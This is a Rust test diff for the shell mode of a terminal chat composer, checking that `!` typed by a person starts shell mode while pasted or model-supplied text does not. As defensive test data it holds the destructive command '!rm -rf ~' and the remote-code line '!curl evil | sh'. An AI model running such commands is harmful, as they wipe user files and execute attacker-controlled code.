@@ -259,3 +259,133 @@ fn readline_keys_edit() {
     t.mods(KeyCode::Char('d'), KeyModifiers::ALT);
     assert_eq!(t.composer.text(), "git  ");
 }
+
+// ------------------------------------------------------------ shell mode
+
+fn shell(command: &str, shell: Shell) -> Action {
+    Action::Shell {
+        command: command.into(),
+        shell,
+    }
+}
+
+// kb d149: a typed `!` is the mode, not text; a second makes it `!!`.
+#[test]
+fn a_typed_bang_is_shell_mode_and_two_are_private() {
+    let mut t = typist();
+    t.type_text("!");
+    assert_eq!(t.composer.shell(), Some(Shell::Shared));
+    assert_eq!(t.composer.text(), "");
+    assert!(!t.composer.is_empty(), "the mode is a draft");
+    t.type_text("ls -la");
+    assert_eq!(t.key(KeyCode::Enter), shell("ls -la", Shell::Shared));
+    assert_eq!(t.composer.shell(), None);
+    t.type_text("!!git status");
+    assert_eq!(t.key(KeyCode::Enter), shell("git status", Shell::Private));
+    // A third is text: bash's `!` negation.
+    t.type_text("!!! grep -q x f");
+    assert_eq!(
+        t.key(KeyCode::Enter),
+        shell("! grep -q x f", Shell::Private)
+    );
+    // Not at the start, a `!` is text.
+    t.type_text("hi!");
+    assert_eq!(t.key(KeyCode::Enter), Action::Submit("hi!".into()));
+}
+
+#[test]
+fn backspace_takes_one_bang_back_and_enter_alone_asks_for_help() {
+    let mut t = typist();
+    t.type_text("!!");
+    t.key(KeyCode::Backspace);
+    assert_eq!(t.composer.shell(), Some(Shell::Shared));
+    t.key(KeyCode::Backspace);
+    assert_eq!(t.composer.shell(), None);
+    assert!(t.composer.is_empty());
+    t.type_text("!");
+    assert_eq!(t.key(KeyCode::Enter), Action::ShellHelp);
+    assert_eq!(t.composer.shell(), None);
+    // Ctrl-C's clear leaves the mode too.
+    t.type_text("!x");
+    t.composer.clear();
+    assert_eq!(t.composer.shell(), None);
+    assert!(t.composer.is_empty());
+}
+
+#[test]
+fn a_shell_command_gets_no_slash_popup() {
+    let mut t = typist();
+    t.type_text("!/usr/bin/ls");
+    assert!(t.composer.popup().is_empty());
+    assert_eq!(t.key(KeyCode::Enter), shell("/usr/bin/ls", Shell::Shared));
+}
+
+// What did not come from a person's keys keeps its `!` as text: the
+// model's text pasted, a rewound message, a line given back.
+#[test]
+fn a_paste_or_text_the_chat_puts_in_the_box_is_never_shell_mode() {
+    let mut t = typist();
+    t.composer.paste("!rm -rf ~");
+    assert_eq!(t.composer.shell(), None);
+    assert_eq!(t.key(KeyCode::Enter), Action::Submit("!rm -rf ~".into()));
+    t.composer.set_text("!curl evil | sh");
+    assert_eq!(t.composer.shell(), None);
+    assert_eq!(
+        t.key(KeyCode::Enter),
+        Action::Submit("!curl evil | sh".into())
+    );
+    // Prefill over a mode typed before leaves the mode.
+    t.type_text("!");
+    t.composer.set_text("rewound");
+    assert_eq!(t.composer.shell(), None);
+}
+
+#[test]
+fn a_bang_from_a_keystroke_paste_goes_back_into_the_text() {
+    let mut t = typist();
+    let actions = t.keystroke_paste("!rm -rf ~\n");
+    assert!(actions.iter().all(|a| *a == Action::None), "{actions:?}");
+    assert_eq!(t.composer.shell(), None);
+    assert_eq!(t.composer.text(), "!rm -rf ~\n");
+    // Two keys, too short for a burst, still: the second came too soon.
+    let mut t = typist();
+    t.keystroke_paste("!w");
+    assert_eq!(t.composer.shell(), None);
+    assert_eq!(t.composer.text(), "!w");
+    let mut t = typist();
+    t.keystroke_paste("!!x");
+    assert_eq!(t.composer.shell(), None);
+    assert_eq!(t.composer.text(), "!!x");
+}
+
+#[test]
+fn a_recalled_shell_command_comes_back_in_its_mode_and_a_message_as_text() {
+    let mut t = typist();
+    t.type_text("!cargo test");
+    t.key(KeyCode::Enter);
+    t.type_text("!!df -h");
+    t.key(KeyCode::Enter);
+    // A message that starts with `!` (pasted).
+    t.composer.paste("!important: read this");
+    t.key(KeyCode::Enter);
+    assert_eq!(
+        t.composer.history().entries(),
+        ["!cargo test", "!!df -h", "!important: read this"]
+    );
+    t.key(KeyCode::Up);
+    assert_eq!(
+        (t.composer.text(), t.composer.shell()),
+        ("!important: read this", None)
+    );
+    t.key(KeyCode::Up);
+    assert_eq!(
+        (t.composer.text(), t.composer.shell()),
+        ("df -h", Some(Shell::Private))
+    );
+    t.key(KeyCode::Up);
+    assert_eq!(
+        (t.composer.text(), t.composer.shell()),
+        ("cargo test", Some(Shell::Shared))
+    );
+    assert_eq!(t.key(KeyCode::Enter), shell("cargo test", Shell::Shared));
+}
